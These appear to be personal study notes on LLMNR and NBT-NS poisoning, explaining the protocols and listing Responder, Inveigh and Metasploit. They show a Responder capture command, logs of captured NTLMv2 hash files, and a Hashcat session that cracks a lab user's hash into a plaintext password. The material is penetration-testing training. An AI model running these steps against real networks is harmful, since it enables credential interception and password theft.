[Link-Local Multicast Name Resolution](https://datatracker.ietf.org/doc/html/rfc4795) (LLMNR) and [NetBIOS Name Service](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc940063\(v=technet.10\)?redirectedfrom=MSDN) (NBT-NS) server as alternate method of host identification used when DNS fails. 

if machine fail to resolve so it ask to other host via `LLMNR` and use `5355` port `udp`. if `LLMNR` fail so `NBT-NS` used to identify the system on local network by `NetBIOS` and utilize the `137` port `udp`.

Any host can replay the request so we use `Responder` to poison the request and pretend as a host that he is looking for. If the host request to authenticate so we can capture the credentials and brute force the hash.

`NTLMv1` and `NTLMv2` are authentication protocols that utilize the `LM` or `NT` hash

|**Tool**|**Description**|
|---|---|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|
Lets talk about responder, `-A` flag puts us into analyze mode,  we  use `-wf`; this will start the `WPAD` rogue proxy server,  -f attempt for fingerprint, `-v` verbose , `-F` and `-P` can be used to force NTLM or Basic authentication and force proxy authentication, but may cause a login prompt, so they should be used sparingly. `-w` flag utilizes the built-in `WPAD` proxy server.

`Responder` print on screen and log file `/usr/share/responder/logs`. Hashes are saved in the format `(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt`. Hashes stored in `SQLite` database that can be configured in `responder.conf`. Any of the rogue servers like `SMB` can be disabled in the `Responder.conf` file.

```
sudo responder -I ens224
```
#### Capturing with Responder
![[Pasted image 20260116002424.png]]

```bash
 ls

Analyzer-Session.log                Responder-Session.log
Config-Responder.log                SMB-NTLMv2-SSP-172.16.5.200.txt
HTTP-NTLMv2-172.16.5.200.txt        SMB-NTLMv2-SSP-172.16.5.25.txt
Poisoners-Session.log               SMB-NTLMv2-SSP-172.16.5.50.txt
Proxy-Auth-NTLMv2-172.16.5.200.txt
```

After the hash obtained we can pass to `Hashcat` using hash mode `5600` for `NTLMv2` hashes.
#### Cracking an NTLMv2 Hash With Hashcat

```shell
hashcat -m 5600 hash_file /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt

FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2  
<SNIP>

Started: Mon Feb 28 15:20:29 2022
Stopped: Mon Feb 28 15:20:42 2022
```

































